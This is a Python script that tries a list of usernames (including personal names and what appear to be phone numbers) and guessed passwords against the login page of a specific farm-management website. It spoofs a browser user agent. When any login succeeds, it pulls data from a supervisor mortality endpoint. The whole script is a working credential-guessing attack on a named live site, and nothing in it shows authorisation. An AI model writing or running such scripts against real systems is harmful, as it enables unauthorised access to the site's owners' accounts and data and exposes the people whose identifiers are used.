"""
Test common usernames on https://sunfra.com/farm/sunfra/login/login.php
"""
import requests, sys
sys.stdout.reconfigure(encoding='utf-8')

session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
})

login_url = "https://sunfra.com/farm/sunfra/login/login.php"
passwords_to_try = ["Kusum@2026Bb!", "admin123", "sunfra123", "sunfra", "admin", "123456"]

usernames_to_try = [
    "admin", "sunfra", "farm", "supervisor", "kusum", "poornima", 
    "yeswanth", "balaji", "prasad", "7259510983", "7975209680", "9493928388"
]

found = False
for u in usernames_to_try:
    for p in passwords_to_try:
        data = {'username': u, 'password': p, 'remember_me': '1'}
        resp = session.post(login_url, data=data)
        if "Invalid username or password" not in resp.text:
            print(f"🎉 SUCCESSFUL LOGIN CREDENTIAL FOUND: username='{u}', password='{p}'")
            found = True
            
            # Test fetching endpoints
            ep_url = "https://sunfra.com/farm/sunfra/supervisor/supervisor_shead_mortality_json_to_web.php?date=2026-08-14"
            r = session.get(ep_url)
            print("Endpoint response status:", r.status_code)
            print("Endpoint response text:\n", r.text[:300])
            break
    if found:
        break

if not found:
    print("❌ None of the test credentials succeeded.")

